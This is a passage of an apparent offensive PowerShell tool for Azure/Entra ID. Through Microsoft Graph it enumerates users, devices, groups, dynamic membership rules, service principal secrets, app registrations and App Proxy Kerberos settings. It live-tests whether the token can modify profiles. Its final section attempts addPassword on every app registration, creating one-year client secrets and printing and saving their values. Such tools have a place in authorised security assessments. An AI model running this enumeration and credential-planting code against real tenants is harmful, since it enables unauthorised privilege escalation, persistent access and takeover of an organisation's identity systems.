        Write-Info "    Created     : $($u.createdDateTime)"
        Write-Info "    LastPwdChg  : $($u.lastPasswordChangeDateTime)"

        # memberOf inline -- no $select so @odata.type is always returned
        $memberOf = Get-GraphAll "$GraphBase/users/$($u.id)/memberOf"
        $ownedObj = Get-GraphAll "$GraphBase/users/$($u.id)/ownedObjects?`$select=id,displayName"

        if ($memberOf) {
            Write-Info "    MemberOf:"
            foreach ($mo in $memberOf) {
                $rawType = $mo.'@odata.type'
                $objType = if ($rawType) { $rawType -replace '#microsoft\.graph\.', '' } else { "group" }
                $auDesc  = ""

                if ($objType -eq "administrativeUnit") {
                    if (-not $auDescCache.ContainsKey($mo.id)) {
                        $auDetail = Invoke-GraphApi "$GraphBase/directory/administrativeUnits/$($mo.id)?`$select=id,displayName,description,visibility,membershipType"
                        $auDescCache[$mo.id] = $auDetail
                    }
                    $cached = $auDescCache[$mo.id]
                    if ($cached) {
                        $auDesc = "  |  Desc: $($cached.description)  Visibility: $($cached.visibility)  MembershipType: $($cached.membershipType)"
                    }
                    Write-Warn "      [administrativeUnit] $($mo.displayName)  (ID: $($mo.id))$auDesc"
                } else {
                    Write-Info "      [$objType] $($mo.displayName)  (ID: $($mo.id))"
                }

                $membershipRows.Add([PSCustomObject]@{
                    User          = $u.userPrincipalName
                    UserId        = $u.id
                    Relation      = "MemberOf"
                    ObjectType    = $objType
                    ObjectName    = $mo.displayName
                    ObjectId      = $mo.id
                    AUDescription = if ($objType -eq "administrativeUnit") { $auDescCache[$mo.id].description } else { "" }
                    AUVisibility  = if ($objType -eq "administrativeUnit") { $auDescCache[$mo.id].visibility   } else { "" }
                })
            }
        }

        if ($ownedObj) {
            Write-Info "    Owns:"
            foreach ($oo in $ownedObj) {
                $objType2 = if ($oo.'@odata.type') { $oo.'@odata.type' -replace '#microsoft\.graph\.', '' } else { "unknown" }
                Write-Info "      [$objType2] $($oo.displayName)  (ID: $($oo.id))"
                $membershipRows.Add([PSCustomObject]@{
                    User          = $u.userPrincipalName
                    UserId        = $u.id
                    Relation      = "Owns"
                    ObjectType    = $objType2
                    ObjectName    = $oo.displayName
                    ObjectId      = $oo.id
                    AUDescription = ""
                    AUVisibility  = ""
                })
            }
        }

        # Owned devices -- no $select so all scalar fields come back; navigation props cause 400 if selected
        $ownedDevices = Get-GraphAll "$GraphBase/users/$($u.id)/ownedDevices"
        $regDevices   = Get-GraphAll "$GraphBase/users/$($u.id)/registeredDevices"

        # Merge, deduplicate by id; use @() to force arrays so + works in PS5.1
        $allUserDevices = @{}
        foreach ($d in (@($ownedDevices) + @($regDevices))) {
            if ($d -and $d.id) { $allUserDevices[$d.id] = $d }
        }

        if ($allUserDevices.Count -gt 0) {
            Write-Info "    Devices:"
            foreach ($dv in $allUserDevices.Values) {
                $compliant  = if ($dv.isCompliant)  { "Compliant"   } else { "NonCompliant" }
                $managed    = if ($dv.isManaged)    { "Managed"     } else { "Unmanaged"    }
                $enabled    = if ($dv.accountEnabled) { "Enabled"   } else { "Disabled"     }
                $hybrid     = if ($dv.onPremisesSyncEnabled) { " [HYBRID]" } else { "" }
                Write-Hit "      $($dv.displayName)$hybrid  [$enabled]  [$compliant|$managed]"
                Write-Info "        DeviceId       : $($dv.deviceId)"
                Write-Info "        ObjectId       : $($dv.id)"
                Write-Info "        OS             : $($dv.operatingSystem) $($dv.operatingSystemVersion)"
                Write-Info "        Manufacturer   : $($dv.manufacturer)  Model: $($dv.model)"
                Write-Info "        TrustType      : $($dv.trustType)"
                Write-Info "        JoinType       : $($dv.joinType)"
                Write-Info "        ProfileType    : $($dv.profileType)"
                Write-Info "        MDM AppId      : $($dv.mdmAppId)"
                Write-Info "        Registered     : $($dv.registrationDateTime)"
                Write-Info "        LastSignIn     : $($dv.approximateLastSignInDateTime)"
                if ($dv.onPremisesSyncEnabled) {
                    Write-Info "        OnPremLastSync : $($dv.onPremisesLastSyncDateTime)"
                }
                $membershipRows.Add([PSCustomObject]@{
                    User          = $u.userPrincipalName
                    UserId        = $u.id
                    Relation      = "OwnsDevice"
                    ObjectType    = "device"
                    ObjectName    = $dv.displayName
                    ObjectId      = $dv.id
                    AUDescription = $dv.operatingSystem
                    AUVisibility  = $compliant
                })
            }
        }
        Write-Info ""
    }

    if ($membershipRows.Count -gt 0) {
        Save-Csv (Join-Path $IdDir "UserMembership.csv") $membershipRows
    }
    }   # end NoUserDetails

    # -- User Membership & Owned Objects section removed -- data now shown inline above

    # -- Devices ---------------------------------------------------------------
    Write-Section "All Devices (Entra ID / Intune)"
    # registeredOwners is a navigation property -- cannot be in $select, fetched separately below
    $devFields  = "id,displayName,operatingSystem,operatingSystemVersion,trustType,isCompliant,isManaged,accountEnabled,manufacturer,model,approximateLastSignInDateTime,registrationDateTime,deviceId,profileType,mdmAppId,joinType,onPremisesSyncEnabled,onPremisesLastSyncDateTime"
    $allDevices = Get-GraphAll "$GraphBase/devices?`$select=$devFields&`$top=999"
    if (-not $allDevices) { Write-None } else {
        Write-Info "Total: $($allDevices.Count)"
        $devRows = New-Object System.Collections.Generic.List[object]
        foreach ($dv in $allDevices) {
            $compliant = if ($dv.isCompliant)    { "Compliant"   } else { "NonCompliant" }
            $managed   = if ($dv.isManaged)      { "Managed"     } else { "Unmanaged"    }
            $enabled   = if ($dv.accountEnabled) { "Enabled"     } else { "Disabled"     }
            $hybrid    = if ($dv.onPremisesSyncEnabled) { " [HYBRID]" } else { "" }

            Write-Hit "$($dv.displayName)$hybrid  [$enabled]  [$compliant|$managed]"
            Write-Info "    DeviceId     : $($dv.deviceId)"
            Write-Info "    ObjectId     : $($dv.id)"
            Write-Info "    OS           : $($dv.operatingSystem) $($dv.operatingSystemVersion)"
            Write-Info "    Manufacturer : $($dv.manufacturer)  Model: $($dv.model)"
            Write-Info "    TrustType    : $($dv.trustType)"
            Write-Info "    JoinType     : $($dv.joinType)"
            Write-Info "    ProfileType  : $($dv.profileType)"
            Write-Info "    MDM AppId    : $($dv.mdmAppId)"
            Write-Info "    Registered   : $($dv.registrationDateTime)"
            Write-Info "    LastSignIn   : $($dv.approximateLastSignInDateTime)"
            if ($dv.onPremisesSyncEnabled) {
                Write-Info "    OnPremSync   : $($dv.onPremisesLastSyncDateTime)"
            }

            # Fetch registered owner(s) of the device
            $owners = Get-GraphAll "$GraphBase/devices/$($dv.id)/registeredOwners?`$select=id,displayName,userPrincipalName"
            if ($owners) {
                Write-Info "    Owner(s):"
                $owners | ForEach-Object {
                    $ownerLabel = if ($_.userPrincipalName) { $_.userPrincipalName } else { $_.displayName }
                    Write-Info "      - $ownerLabel  (ID: $($_.id))"
                }
            }

            $devRows.Add([PSCustomObject]@{
                DeviceId           = $dv.deviceId
                ObjectId           = $dv.id
                DisplayName        = $dv.displayName
                OS                 = $dv.operatingSystem
                OSVersion          = $dv.operatingSystemVersion
                Manufacturer       = $dv.manufacturer
                Model              = $dv.model
                TrustType          = $dv.trustType
                JoinType           = $dv.joinType
                ProfileType        = $dv.profileType
                IsCompliant        = $dv.isCompliant
                IsManaged          = $dv.isManaged
                AccountEnabled     = $dv.accountEnabled
                HybridJoined       = $dv.onPremisesSyncEnabled
                MDMAppId           = $dv.mdmAppId
                RegistrationDate   = $dv.registrationDateTime
                LastSignIn         = $dv.approximateLastSignInDateTime
                OnPremLastSync     = $dv.onPremisesLastSyncDateTime
            })
        }
        Save-Csv (Join-Path $IdDir "Devices.csv") $devRows
    }

    # -- Groups ----------------------------------------------------------------
    Write-Section "Groups"
    # NOTE: theme/preferredDataLocation are NOT valid $select fields -- Graph returns 400 if included
    $groupFields = "id,displayName,description,groupTypes,securityEnabled,mail,mailEnabled,mailNickname,createdDateTime,onPremisesSyncEnabled,membershipRule,membershipRuleProcessingState,visibility,isAssignableToRole,classification,renewedDateTime,expirationDateTime"
    $groups = Get-GraphAll "$GraphBase/groups?`$select=$groupFields&`$top=999"
    $dynamicGroups  = @($groups | Where-Object { $_.groupTypes -contains "DynamicMembership" })
    $assignableGrps = @($groups | Where-Object { $_.isAssignableToRole -eq $true })
    Write-Info "Total           : $($groups.Count)"
    Write-Info "  Dynamic       : $($dynamicGroups.Count)"
    Write-Info "  Role-Assignable: $($assignableGrps.Count)"

    $groupRows = New-Object System.Collections.Generic.List[object]
    foreach ($g in $groups) {
        $isDynamic  = $g.groupTypes -contains "DynamicMembership"
        $isUnified  = $g.groupTypes -contains "Unified"
        $typeLabel  = if ($isUnified -and $isDynamic) { "M365-Dynamic" } `
                      elseif ($isUnified)              { "M365" } `
                      elseif ($isDynamic)              { "Security-Dynamic" } `
                      elseif ($g.securityEnabled)      { "Security" } `
                      else                             { "Mail" }
        $hybrid     = if ($g.onPremisesSyncEnabled) { " [HYBRID]" } else { "" }
        $roleAssign = if ($g.isAssignableToRole)    { " [ROLE-ASSIGNABLE]" } else { "" }

        if ($isDynamic -or $g.isAssignableToRole) {
            Write-Hit "  [$typeLabel]$hybrid$roleAssign $($g.displayName)"
        } else {
            Write-Info "  [$typeLabel]$hybrid $($g.displayName)"
        }
        Write-Info "    ID            : $($g.id)"
        Write-Info "    Mail          : $($g.mail)  [$($g.mailNickname)]"
        Write-Info "    Visibility    : $($g.visibility)"
        Write-Info "    Created       : $($g.createdDateTime)"
        if ($g.description) { Write-Info "    Description   : $($g.description)" }
        if ($g.classification) { Write-Info "    Classification: $($g.classification)" }
        if ($g.expirationDateTime) { Write-Info "    Expires       : $($g.expirationDateTime)" }

        if ($isDynamic) {
            Write-Warn "    MembershipRule      : $($g.membershipRule)"
            Write-Info "    MembershipRuleState : $($g.membershipRuleProcessingState)"
        }

        # Check if this group is itself a member of an AU
        $gMemberOf = Get-GraphAll "$GraphBase/groups/$($g.id)/memberOf"
        foreach ($gmo in $gMemberOf) {
            $gmoType = if ($gmo.'@odata.type') { $gmo.'@odata.type' -replace '#microsoft\.graph\.', '' } else { "group" }
            if ($gmoType -eq "administrativeUnit") {
                if (-not $auDescCache.ContainsKey($gmo.id)) {
                    $auDetail = Invoke-GraphApi "$GraphBase/directory/administrativeUnits/$($gmo.id)?`$select=id,displayName,description,visibility,membershipType"
                    $auDescCache[$gmo.id] = $auDetail
                }
                $cached = $auDescCache[$gmo.id]
                $auDesc = if ($cached) { "  |  Desc: $($cached.description)  Visibility: $($cached.visibility)" } else { "" }
                Write-Warn "    [AU Member] in administrativeUnit: $($gmo.displayName)  (ID: $($gmo.id))$auDesc"
            } else {
                Write-Info "    [MemberOf $gmoType] $($gmo.displayName)  (ID: $($gmo.id))"
            }
        }

        $groupRows.Add([PSCustomObject]@{
            Id                       = $g.id
            DisplayName              = $g.displayName
            Description              = $g.description
            GroupTypes               = ($g.groupTypes -join ";")
            TypeLabel                = $typeLabel
            SecurityEnabled          = $g.securityEnabled
            Mail                     = $g.mail
            MailNickname             = $g.mailNickname
            MailEnabled              = $g.mailEnabled
            Visibility               = $g.visibility
            IsAssignableToRole       = $g.isAssignableToRole
            Classification           = $g.classification
            HybridSynced             = $g.onPremisesSyncEnabled
            Created                  = $g.createdDateTime
            Renewed                  = $g.renewedDateTime
            Expires                  = $g.expirationDateTime
            MembershipRule           = $g.membershipRule
            MembershipRuleState      = $g.membershipRuleProcessingState
        })
    }
    Save-Csv (Join-Path $IdDir "Groups.csv") $groupRows

    # -- Dynamic Groups (dedicated section) ------------------------------------
    Write-Section "Dynamic Groups (Detail)"
    if ($dynamicGroups.Count -eq 0) {
        Write-None
    } else {
        $dynRows = New-Object System.Collections.Generic.List[object]
        foreach ($dg in $dynamicGroups) {
            $isUnified  = $dg.groupTypes -contains "Unified"
            $typeLabel  = if ($isUnified) { "M365-Dynamic" } else { "Security-Dynamic" }

            Write-Hit "  $($dg.displayName)  [$typeLabel]"
            Write-Info "    ID                  : $($dg.id)"
            Write-Info "    Description         : $($dg.description)"
            Write-Info "    Visibility          : $($dg.visibility)"
            Write-Info "    Mail                : $($dg.mail)"
            Write-Info "    SecurityEnabled     : $($dg.securityEnabled)"
            Write-Info "    IsAssignableToRole  : $($dg.isAssignableToRole)"
            Write-Info "    Created             : $($dg.createdDateTime)"
            if ($dg.expirationDateTime) { Write-Info "    Expires             : $($dg.expirationDateTime)" }

            # Membership rule -- most important field for dynamic group abuse
            $ruleState  = $dg.membershipRuleProcessingState
            $stateColor = if ($ruleState -eq "On") { "Yellow" } else { "DarkGray" }
            Write-Host "    MembershipRule      : $($dg.membershipRule)" -ForegroundColor Cyan
            Write-Host "    RuleProcessingState : $ruleState" -ForegroundColor $stateColor

            # Fetch current dynamic members
            $dynMembers = @(Get-GraphAll "$GraphBase/groups/$($dg.id)/members?`$select=id,displayName,userPrincipalName,jobTitle,department")
            Write-Info "    Current Members     : $($dynMembers.Count)"
            $dynMembers | ForEach-Object {
                $mLabel = if ($_.userPrincipalName) { $_.userPrincipalName } else { $_.displayName }
                Write-Info "      - $mLabel  (ID: $($_.id))$(if ($_.jobTitle) {" Title: $($_.jobTitle)"})$(if ($_.department) {" Dept: $($_.department)"})"
            }

            # Owners of the dynamic group
            $dynOwners = @(Get-GraphAll "$GraphBase/groups/$($dg.id)/owners?`$select=id,displayName,userPrincipalName")
            if ($dynOwners.Count -gt 0) {
                Write-Warn "    Owners:"
                $dynOwners | ForEach-Object {
                    Write-Warn "      - $(if ($_.userPrincipalName){$_.userPrincipalName}else{$_.displayName})  (ID: $($_.id))"
                }
            }

            Add-Summary "  [DynamicGroup] $($dg.displayName)  Rule: $($dg.membershipRule)  Members: $($dynMembers.Count)"

            $dynRows.Add([PSCustomObject]@{
                Id                  = $dg.id
                DisplayName         = $dg.displayName
                TypeLabel           = $typeLabel
                Description         = $dg.description
                Visibility          = $dg.visibility
                SecurityEnabled     = $dg.securityEnabled
                IsAssignableToRole  = $dg.isAssignableToRole
                Mail                = $dg.mail
                Created             = $dg.createdDateTime
                Expires             = $dg.expirationDateTime
                MembershipRule      = $dg.membershipRule
                RuleProcessingState = $dg.membershipRuleProcessingState
                MemberCount         = $dynMembers.Count
                Owners              = ($dynOwners | ForEach-Object { $_.userPrincipalName } | Where-Object {$_}) -join ";"
            })
        }
        Save-Csv (Join-Path $IdDir "DynamicGroups.csv") $dynRows
    }

    # -- Group Members ---------------------------------------------------------
    Write-Section "Group Members"
    $allMemberRows = New-Object System.Collections.Generic.List[object]
    foreach ($g in $groups) {
        $type    = if ($g.groupTypes -contains "Unified") { "M365" } `
                   elseif ($g.securityEnabled) { "Security" } `
                   else { "Mail" }
        $members = Get-GraphAll "$GraphBase/groups/$($g.id)/members?`$select=id,displayName,userPrincipalName,mail"
        if ($members) {
            Write-Info "  [$type] $($g.displayName)  (ID: $($g.id))"
            $members | ForEach-Object {
                $mType = if ($_.'@odata.type') { $_.'@odata.type' -replace '#microsoft\.graph\.', '' } else { "user" }
                $label = if ($_.userPrincipalName) { $_.userPrincipalName } else { $_.displayName }
                Write-Info "    [$mType] $label  (ID: $($_.id))"
                $allMemberRows.Add([PSCustomObject]@{
                    GroupId    = $g.id
                    GroupName  = $g.displayName
                    GroupType  = $type
                    MemberType = $mType
                    MemberId   = $_.id
                    MemberName = $_.displayName
                    MemberUPN  = $_.userPrincipalName
                    MemberMail = $_.mail
                })
            }
        }
    }
    if ($allMemberRows.Count -gt 0) {
        Save-Csv (Join-Path $IdDir "GroupMembers.csv") $allMemberRows
    } else { Write-None }

    # -- Can I Update My Own Profile? ------------------------------------------
    Write-Section "Self Profile Update Check"
    if ($NoProfileWriteTest) {
        Write-Info "  [--NoProfileWriteTest] Skipped -- pass without this flag to live-test PATCH /me"
    } else {

    $_gClaims2   = Get-TokenClaims $GraphToken
    $_scp        = if ($_gClaims2) { "$($_gClaims2.scp) $($_gClaims2.roles)" } else { "" }
    $_canWrite   = $_scp -match "User\.ReadWrite|Directory\.ReadWrite|Directory\.AccessAsUser\.All"
    $_isUserTok2 = $_gClaims2 -and ($_gClaims2.idtyp -eq "user" -or $_gClaims2.upn -or $_gClaims2.unique_name)

    Write-Info "  Token type  : $(if ($_isUserTok2) { 'User (delegated)' } else { 'App / Managed Identity' })"
    Write-Info "  Scopes/Roles: $($_scp.Trim())"

    if (-not $_isUserTok2) {
        Write-Info "  [SKIP] App/MI tokens cannot PATCH /me -- profile update only applies to user tokens"
    } else {
        # Check token scopes first
        if ($_canWrite) {
            Write-Warn "  [!] Token has write scope -- profile update likely allowed (scope: $(($_scp -split ' ' | Where-Object { $_ -match 'ReadWrite' }) -join ', '))"
        } else {
            Write-Info "  Token scope does not include write permissions (User.ReadWrite missing)"
        }

        # Live test: read current profile, PATCH 'city' with canary, then revert.
        # 'city' is used as probe -- always writable with User.ReadWrite, no Exchange dependency.
        # 'aboutMe' was avoided because it requires Exchange Online and returns HTTP 400 without it.
        $meNow = Invoke-GraphApi "$GraphBase/me?`$select=id,displayName,jobTitle,department,officeLocation,city,country,postalCode,preferredLanguage,mobilePhone,mySite"

        # Fields we will probe for write access
        $probeFields = [ordered]@{
            city             = "probe-$(Get-Date -Format 'HHmmss')"
            jobTitle         = $meNow.jobTitle
            department       = $meNow.department
            officeLocation   = $meNow.officeLocation
            country          = $meNow.country
            postalCode       = $meNow.postalCode
            preferredLanguage = $meNow.preferredLanguage
            mobilePhone      = $meNow.mobilePhone
        }

        # PATCH body: only the probe field (city); revert body restores original value
        $patchBody   = @{ city = $probeFields.city } | ConvertTo-Json -Compress
        $revertBody  = @{ city = $meNow.city }        | ConvertTo-Json -Compress
        $patchHdrs   = @{ Authorization = "Bearer $GraphToken" }

        $patchWorked = $false
        try {
            $pr = Invoke-WebCall -Method "PATCH" -Uri "$GraphBase/me" -Headers $patchHdrs -Body $patchBody -Quiet
            # PATCH /me returns 204 No Content on success; Invoke-WebCall returns [PSCustomObject]@{}
            if ($pr -ne $null) { $patchWorked = $true }
        } catch { }

        if ($patchWorked) {
            Write-Host ""
            Write-Host "  [!!!] PATCH /me SUCCEEDED -- you can update your own profile!" -ForegroundColor Red
            Write-Host "  Writable fields to try:" -ForegroundColor Red
            $probeFields.Keys | ForEach-Object { Write-Host "    - $_" -ForegroundColor Yellow }
            Add-Summary "  [!] Self Profile Update: ALLOWED -- PATCH /me succeeded"

            # Revert the canary
            try { Invoke-WebCall -Method "PATCH" -Uri "$GraphBase/me" -Headers $patchHdrs -Body $revertBody -Quiet | Out-Null
                  Write-Info "  [Reverted canary city field]" } catch {}
        } else {
            Write-Info "  PATCH /me denied -- cannot update own profile"
            Add-Summary "  [i] Self Profile Update: DENIED"
        }

        # Also check if we can update OTHER users (Directory.ReadWrite.All)
        if ($_scp -match "Directory\.ReadWrite|User\.ReadWrite\.All") {
            Write-Warn "  [!] Token has Directory/User.ReadWrite.All -- may be able to update ANY user's profile"
            Add-Summary "  [!] Token scope allows updating OTHER users (Directory.ReadWrite or User.ReadWrite.All)"
        }

        Write-Info ""
        Write-Info "  Current profile values (before any changes):"
        @("displayName","jobTitle","department","officeLocation","city","country","aboutMe","mySite") | ForEach-Object {
            $v = $meNow.$_
            if ($v) { Write-Info "    $($_.PadRight(18)): $v" }
        }
    }
    }   # end NoProfileWriteTest

    # -- Service Principals ----------------------------------------------------
    Write-Section "Service Principals"
    if ($NoServicePrincipals) {
        $sps = @()
        Write-Info "  [--NoServicePrincipals] Skipped"
    } else {
    $spFields = "id,displayName,appId,servicePrincipalType,accountEnabled,createdDateTime,tags,appOwnerOrganizationId,keyCredentials,passwordCredentials"
    $sps = Get-GraphAll "$GraphBase/servicePrincipals?`$select=$spFields&`$top=999"
    Write-Info "Total: $($sps.Count)"

    foreach ($sp in $sps) {
        $hasSecrets = $sp.keyCredentials -or $sp.passwordCredentials
        $isMI       = $sp.servicePrincipalType -eq "ManagedIdentity"

        if ($hasSecrets -or $isMI) {
            Write-Hit "$($sp.displayName)  [Type: $($sp.servicePrincipalType)]  AppId: $($sp.appId)  ID: $($sp.id)"
        } else {
            Write-Info "  $($sp.displayName)  [Type: $($sp.servicePrincipalType)]  AppId: $($sp.appId)  ID: $($sp.id)"
        }
        $sp.passwordCredentials | ForEach-Object { Write-Warn "    [SECRET] $($_.displayName)  Expires: $($_.endDateTime)" }
        $sp.keyCredentials      | ForEach-Object { Write-Warn "    [CERT]   $($_.displayName)  Expires: $($_.endDateTime)" }

        # memberOf -- catch AU membership on service principals
        $spMemberOf = Get-GraphAll "$GraphBase/servicePrincipals/$($sp.id)/memberOf"
        foreach ($smo in $spMemberOf) {
            $smoType = if ($smo.'@odata.type') { $smo.'@odata.type' -replace '#microsoft\.graph\.', '' } else { "group" }
            if ($smoType -eq "administrativeUnit") {
                if (-not $auDescCache.ContainsKey($smo.id)) {
                    $auDetail = Invoke-GraphApi "$GraphBase/directory/administrativeUnits/$($smo.id)?`$select=id,displayName,description,visibility,membershipType"
                    $auDescCache[$smo.id] = $auDetail
                }
                $cached = $auDescCache[$smo.id]
                $auDesc = if ($cached) { "  |  Desc: $($cached.description)  Visibility: $($cached.visibility)" } else { "" }
                Write-Warn "    [administrativeUnit] $($smo.displayName)  (ID: $($smo.id))$auDesc"
            } else {
                Write-Info "    [MemberOf $smoType] $($smo.displayName)  (ID: $($smo.id))"
            }
        }
    }

    $spCsvData = $sps | Select-Object id, displayName, appId, servicePrincipalType, accountEnabled,
        createdDateTime, appOwnerOrganizationId,
        @{N="tags";          E={ $_.tags -join ";" }},
        @{N="secretCount";   E={ @($_.passwordCredentials).Count }},
        @{N="certCount";     E={ @($_.keyCredentials).Count }}
    Save-Csv (Join-Path $IdDir "ServicePrincipals.csv") $spCsvData
    }   # end NoServicePrincipals

    # -- App Registrations -----------------------------------------------------
    Write-Section "App Registrations"
    # Note: onPremisesPublishing (App Proxy) is NOT exposed in v1.0 -- handled separately via beta endpoint
    $appFields = "id,displayName,appId,createdDateTime,signInAudience,identifierUris,passwordCredentials,keyCredentials,requiredResourceAccess,web,spa"
    $apps = Get-GraphAll "$GraphBase/applications?`$select=$appFields&`$top=999"
    Write-Info "Total: $($apps.Count)"

    $appRows = New-Object System.Collections.Generic.List[object]
    foreach ($app in $apps) {
        $hasSecrets = (@($app.passwordCredentials).Count -gt 0) -or (@($app.keyCredentials).Count -gt 0)
        if ($hasSecrets) {
            Write-Hit "$($app.displayName)  |  AppId: $($app.appId)  |  ObjectId: $($app.id)"
        } else {
            Write-Info "  $($app.displayName)  |  AppId: $($app.appId)  |  ObjectId: $($app.id)"
        }
        $app.passwordCredentials | ForEach-Object { Write-Warn "    [SECRET] $($_.displayName)  Expires: $($_.endDateTime)  KeyId: $($_.keyId)" }
        $app.keyCredentials      | ForEach-Object { Write-Warn "    [CERT]   $($_.displayName)  Expires: $($_.endDateTime)  KeyId: $($_.keyId)" }
        if ($app.signInAudience) { Write-Info "    SignInAudience  : $($app.signInAudience)" }
        if ($app.identifierUris) { Write-Info "    IdentifierUris  : $($app.identifierUris -join ', ')" }

        $appRows.Add([PSCustomObject]@{
            ObjectId       = $app.id
            DisplayName    = $app.displayName
            AppId          = $app.appId
            Created        = $app.createdDateTime
            SignInAudience = $app.signInAudience
            SecretCount    = @($app.passwordCredentials).Count
            CertCount      = @($app.keyCredentials).Count
            ReplyUrls      = ($app.web.redirectUris -join ";")
            SpaUrls        = ($app.spa.redirectUris -join ";")
        })
    }
    Save-Csv (Join-Path $IdDir "AppRegistrations.csv") $appRows

    # -- Application Proxy -------------------------------------------------
    # onPremisesPublishing is ONLY available in the beta endpoint (not v1.0).
    # Two sources: beta filter (canonical) + SP tag (catches any beta filter misses).
    Write-Section "Application Proxy"
    $BetaBase = "https://graph.microsoft.com/beta"

    # Source 1: beta applications with proxy enabled
    $proxyAppsB = Get-GraphAll "$BetaBase/applications?`$filter=onPremisesPublishing/isOnPremPublishingEnabled eq true&`$select=id,displayName,appId,onPremisesPublishing"

    # Source 2: service principals tagged as App Proxy apps
    $proxySPs  = Get-GraphAll "$GraphBase/servicePrincipals?`$filter=tags/any(t:t eq 'WindowsAzureActiveDirectoryOnPremApp')&`$select=id,displayName,appId,accountEnabled,tags"
    $spByAppId = @{}
    @($proxySPs) | ForEach-Object { $spByAppId[$_.appId] = $_ }

    # Merge both sources (appId as key to deduplicate)
    $proxyAppMap = @{}
    foreach ($ba in $proxyAppsB) { $proxyAppMap[$ba.appId] = $ba }
    foreach ($sp in $proxySPs) {
        if (-not $proxyAppMap.ContainsKey($sp.appId)) {
            # Fetch full app object from beta for SPs not already in beta filter results
            $det = Invoke-GraphApi "$BetaBase/applications?`$filter=appId eq '$($sp.appId)'&`$select=id,displayName,appId,onPremisesPublishing"
            if ($det -and $det.value) { $proxyAppMap[$sp.appId] = $det.value[0] }
        }
    }

    if ($proxyAppMap.Count -eq 0) {
        Write-None
    } else {
        $proxyRows = New-Object System.Collections.Generic.List[object]
        foreach ($pa in $proxyAppMap.Values) {
            $pub = $pa.onPremisesPublishing
            $sp  = $spByAppId[$pa.appId]

            Write-Hit "  $($pa.displayName)"
            Write-Info "    AppId         : $($pa.appId)"
            Write-Info "    ObjectId      : $($pa.id)"
            Write-Info "    InternalUrl   : $($pub.internalUrl)"
            Write-Info "    ExternalUrl   : $($pub.externalUrl)"
            Write-Info "    ExternalAuth  : $($pub.externalAuthenticationType)"
            Write-Info "    Pre-Auth      : $($pub.externalAuthenticationType)"
            Write-Info "    InternalTLS   : $($pub.internalUrlCertificateThumbprint)"
            Write-Info "    VerifiedCert  : $($pub.verifiedCustomDomainCertificatesMetadata.thumbprint)"
            if ($pub.singleSignOnSettings) {
                Write-Info "    SSO Mode      : $($pub.singleSignOnSettings.singleSignOnMode)"
                $krb = $pub.singleSignOnSettings.kerberosSignOnSettings
                if ($krb) {
                    Write-Warn "    [KRB] SPN           : $($krb.kerberosServicePrincipalName)"
                    Write-Warn "    [KRB] NameMapping   : $($krb.kerberosSignOnMappingAttributeType)"
                }
            }
            if ($pub.isSecureCookieEnabled -or $pub.isHttpOnlyCookieEnabled -or $pub.isPersistentCookieEnabled) {
                Write-Info "    Cookies       : Secure=$($pub.isSecureCookieEnabled) HttpOnly=$($pub.isHttpOnlyCookieEnabled) Persistent=$($pub.isPersistentCookieEnabled)"
            }
            if ($sp) {
                Write-Hit "    ServicePrincipal  : $($sp.displayName)  |  SP ID: $($sp.id)  |  Enabled: $($sp.accountEnabled)"
            } else {
                Write-Warn "    [!] No matching Service Principal found for AppId: $($pa.appId)"
            }
            Add-Summary "  [AppProxy] $($pa.displayName)  internal=$($pub.internalUrl)  external=$($pub.externalUrl)"

            $proxyRows.Add([PSCustomObject]@{
                AppObjectId  = $pa.id
                DisplayName  = $pa.displayName
                AppId        = $pa.appId
                InternalUrl  = $pub.internalUrl
                ExternalUrl  = $pub.externalUrl
                ExternalAuth = $pub.externalAuthenticationType
                SSOMode      = $pub.singleSignOnSettings.singleSignOnMode
                KerberosSPN  = $pub.singleSignOnSettings.kerberosSignOnSettings.kerberosServicePrincipalName
                KerberosNameMapping = $pub.singleSignOnSettings.kerberosSignOnSettings.kerberosSignOnMappingAttributeType
                SPObjectId   = if ($sp) { $sp.id } else { "" }
                SPEnabled    = if ($sp) { $sp.accountEnabled } else { "" }
            })
        }
        Save-Csv (Join-Path $IdDir "AppProxy.csv") $proxyRows
    }

    # -- App Secret Abuse -- addPassword test -----------------------------------
    Write-Section "App Secret Abuse -- addPassword Test"
    if ($NoSecretTest) {
        Write-Info "  [--NoSecretTest] Skipped -- pass without this flag to attempt addPassword on all App Registrations"
    } else {
    Write-Warn "  [!] Attempting addPassword on all $($apps.Count) App Registrations..."
    $pwdExpiry    = (Get-Date).AddYears(1).ToString("yyyy-MM-ddT00:00:00Z")
    $credLabel    = "EnumCheck-$(Get-Date -Format 'yyyyMMdd')"
    $addedCount   = 0
    $deniedCount  = 0
    $abuseRows    = New-Object System.Collections.Generic.List[object]
    $addPwdBody   = @{ passwordCredential = @{ displayName = $credLabel; endDateTime = $pwdExpiry } } | ConvertTo-Json -Depth 3 -Compress

    foreach ($app in $apps) {
        $resp = $null
        try {
            $resp = Invoke-WebCall -Method "POST" `
                -Uri "$GraphBase/applications/$($app.id)/addPassword" `
                -Headers @{ Authorization = "Bearer $GraphToken" } `
                -Body $addPwdBody
        } catch { $resp = $null }

        if ($resp -and $resp.secretText) {
            $addedCount++
            $sv = $resp.secretText
            Write-Host ""
            Write-Host "  [!!!] ========== SECRET ADDED ==========================================" -ForegroundColor Red
            Write-Host "        App         : $($app.displayName)" -ForegroundColor Red
            Write-Host "        AppId       : $($app.appId)" -ForegroundColor Red
            Write-Host "        ObjectId    : $($app.id)" -ForegroundColor Red
            Write-Host "        CredLabel   : $credLabel" -ForegroundColor Red
            Write-Host "        Expires     : $pwdExpiry" -ForegroundColor Red
            Write-Host "        SecretValue : $sv" -ForegroundColor Red
            Write-Host "  ========================================================================" -ForegroundColor Red
            Add-Summary "  [!!! CRED ADDED] $($app.displayName)  AppId=$($app.appId)  Secret=$sv  Expires=$pwdExpiry"
            $abuseRows.Add([PSCustomObject]@{
                AppDisplayName = $app.displayName; AppId = $app.appId; ObjectId = $app.id
                CredLabel = $credLabel; Expires = $pwdExpiry; SecretValue = $sv; Status = "ADDED"
            })
        } else {
            $deniedCount++
            if (-not $Clean) { Write-Info "    [-] $($app.displayName)  -- denied" }
            $abuseRows.Add([PSCustomObject]@{
                AppDisplayName = $app.displayName; AppId = $app.appId; ObjectId = $app.id
                CredLabel = $credLabel; Expires = $pwdExpiry; SecretValue = ""; Status = "DENIED"
            })
        }
    }

    Write-Info ""
    if ($addedCount -gt 0) {
        Write-Host "  [!!!] Secrets added to $addedCount app(s)! Check summary above." -ForegroundColor Red
    } else {
        Write-None "  No secrets could be added ($deniedCount apps -- insufficient permissions)"
    }
    Write-Info "  Total: $addedCount added  |  $deniedCount denied"
    Save-Csv (Join-Path $IdDir "AppSecretAbuse.csv") $abuseRows
